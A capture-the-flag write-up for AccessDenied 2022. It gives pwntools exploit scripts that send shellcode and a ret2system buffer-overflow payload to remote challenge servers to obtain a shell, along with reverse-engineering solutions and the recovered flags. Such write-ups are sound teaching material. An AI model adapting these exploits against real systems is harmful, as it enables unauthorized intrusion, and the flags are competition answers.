# Binary Exploitation

## Shellcode

### Files

[Download Files](https://github.com/CodeEatSleepRepeatPY/website/raw/gh-pages/accessdenied-2022/files/shellcode.zip)

### Description

The challenge executes the machine code that we supply to the input.

### Solution

pwntools makes life easy when it comes to crafting shellcode, especially since the character limit is pretty big (512 characters is the limit).

```python
from pwn import *

r = remote('34.134.85.196', 5337)
elf = context.binary = ELF('./shellcode')

payload = flat(
    asm(shellcraft.sh())
)

print(asm(shellcraft.sh()))

r.sendline(payload)
r.interactive()
```
`flag: accessdenied{3x3cut3d_x64_sh3ll_0v3rfl0w_5ucc3ssfully_611a1501}`

## ret2system

### Files

[Download Files](https://github.com/CodeEatSleepRepeatPY/website/raw/gh-pages/accessdenied-2022/files/ret2system.zip)

### Description

The challenge asks us for 2 inputs, the string we want to store and our buffer overflow payload.

### Solution

Since the challenge uses system within the binary itself, we don't need to leak libc, we can just use plt@system to get a shell. In order to get a shell, we need to call `plt@system("/bin/sh")` but after looking through gdb and ida I couldn't find the `/bin/sh` string. This is where we can make use of the first input we're asked to give; Since the program stores the first input into memory we can just supply the `bin/sh` to that input, and we will have it saved in memory. After doing all that, we still need to take care of the stack alignment issues ([read more about stack alignment issues here](https://ropemporium.com/guide.html#Common%20pitfalls)), so we will need to add a return before calling system and that should be it. Running the following code will give us the flag:

```python
from pwn import *
from pprint import pprint

r = remote('34.134.85.196', 9337)
elf = context.binary = ELF('./ret2system')

ret = 0x0804900e

r.sendlineafter(b'value', b'bin/sh\x00')

pprint(elf.sym)

payload = flat(
    'a'*40,
    p32(ret),
    elf.plt['system'],
    p32(0x00),
    elf.sym['store']
)

r.sendlineafter(b'now', payload)
r.interactive()
```

`flag: accessdenied{n3xt_1_w1ll_n0t_1nclud3_system_func710n_1t53lf_e8dd6fc7}`

# Reverse Engineering

## babyrev

### Files

[View Source Code](files/rev1.c)

### Description

The program encrypts a flag, and we're going to have to decrypt it.

### Solution

The reverse function is self-inverse so we can use the same function to decrypt the flag. Doing the encryption steps backwards, will give us the flag.

```python
flag = [-111, -47, -47, -79, -39, -39, 49, -79, 97, -127, -79, 49, -55, 9, 27, 89, -19, 59, 97, 49, -19, 89, -37, 121, -37, 89, -69, -37, -19, -111, 89, -37, -19, 113, -71, 97, -19, -101, 49, 49, 11, 91, -69, 11, -79, -87]
xor = 23

def reverse(ch):
    x=0 
    for i in range(8):
        x*=2
        if ch & (1 << i):
            x+=1
    print(x)
    return chr(x)

for i in range(len(flag)):
    flag[i]^=xor
    flag[i] = reverse(flag[i])
print("".join(flag))
```

`flag: accessdenied{x0r_4nd_r3v3r53_ar3_fun_1dd8258e}`

## Enormous

### Files

[Download Files](https://github.com/CodeEatSleepRepeatPY/website/raw/gh-pages/accessdenied-2022/files/enormous)

### Description

We are given a program that has tons of if statements to check if the input we supplied is correct or not.

### Solution

When I opened up the program up in IDA, i realized that there is a very little chance that the flag would actually be this long. So i tried to find what if statement has a comparison with the number 125 which is the ascii value of `}` (since `}` indicates that we reached the end of the flag) and i realized that it's actually not that far down, so instead of writing a script and automating it, i just ran through the code manually and got the following flag:

`flag: accessdenied{US3_AngR_F0R_M4k1nG_Lif3_B3Tt3R_57a27836}`

## Bits are Fun

### Files 

[View Source Code](files/rev2.c)

### Description

The program encrypts a flag, and we're going to have to decrypt it.

### Solution

The source code looks really tedious to read and can get really confusing. My intuition was telling me that the `left_rotate_and_right_rotate()` function is self-inversible, so i tried it out on a few of my own inputs. After a few expirements i found out that calling the function n-1 times on the input (where n is the number of characters in the flag) will actually revert it back to its original form. So since the encrypted flag has 61 characters, calling the function on the flag 60 times, will give us the flag in its original form (decrypted).

```c
#include <stdio.h>
#include<stdlib.h>
#include<string.h>

#define MAXSIZE 100

char flag[] = {105, 97, 103, 115, 113, 102, 103, 100, 97, 111, 108, 113, 100, 59, 108, 118, 119, 112, 26, 118, 52, 116, 49, 117, 54, 78, 100, 127, 112, 27, 103, 96, 118, 125, 112, 26, 118, 52, 116, 49, 53, 119, 52, 90, 49, 119, 98, 30, 120, 100, 119, 53, 75, 52, 49, 97, 102, 103, 54, 117, 97};

void left_rotate_and_right_rotate(char str[]) {
    int len = strlen(str);
    for(int i = 0; i < 8; i++) {
        if((i & 1)) {
            int store = ((((1 << i) & str[len - 1]) > 0) ? 1 : 0);
            for(int j = len - 2; j >= 0; j--) {
                int bit = ((((1 << i) & str[j]) > 0) ? 1 : 0);
                str[j + 1] &= (~(1 << i));
                str[j + 1] |= (1 << i) * bit;
            }
            str[0] &= (~(1 << i));
            str[0] |= (1 << i) * store;
        }
        else {
            int store = ((((1 << i) & str[0]) > 0) ? 1 : 0);
            for(int j = 1; j < len; j++) {
                int bit = ((((1 << i) & str[j]) > 0) ? 1 : 0);
                str[j - 1] &= (~(1 << i));
                str[j - 1] |= (1 << i) * bit;
            }
            str[len - 1] &= (~(1 << i));
            str[len - 1] |= (1 << i) * store;
        }
    }
}

int main()
{
    for(int i = 0; i < 60; i++){
        left_rotate_and_right_rotate(flag);
    }
    printf("%s", flag);

    return 0;
}
```

`flag: accessdenied{l3ft_r0t4t3_4nd_r1ght_r0t4t35_4r3_h4rd_5a43cfe4}`
